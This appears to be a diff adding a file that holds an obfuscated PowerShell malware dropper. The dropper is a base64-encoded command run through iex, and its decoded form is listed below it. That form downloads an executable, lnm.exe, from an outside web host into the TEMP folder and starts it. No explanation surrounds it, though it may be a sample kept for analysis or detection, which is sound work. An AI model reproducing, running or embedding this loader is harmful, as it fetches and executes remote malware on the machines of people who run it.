@@ -1,0 +1,7 @@
+iex([SYSTEm.TeXt.ENcODINg]::uTF8.gEtsTrIng([sYStem.coNVert]::fROmBaSE64StrInG('CihOZXctT2JqZWN0IHN5c1RlbS5uRVQuV2ViY2xJRW5UKS5Eb3dOTE9hZEZpTGUoJ2h0dHA6Ly93d3cuYXRoZW5zaGVhcnRjZW50ZXIuY29tL2NybS9jZ2ktYmluL2xubS5leGUnLCIkRU52OlRFTVBcbG5tLmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkRU52OlRFTVBcbG5tLmV4ZSIpCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sysTem.nET.WebclIEnT).DowNLOadFiLe('http://www.athensheartcenter.com/crm/cgi-bin/lnm.exe',"$ENv:TEMP\lnm.exe");Start-Process ("$ENv:TEMP\lnm.exe")
+
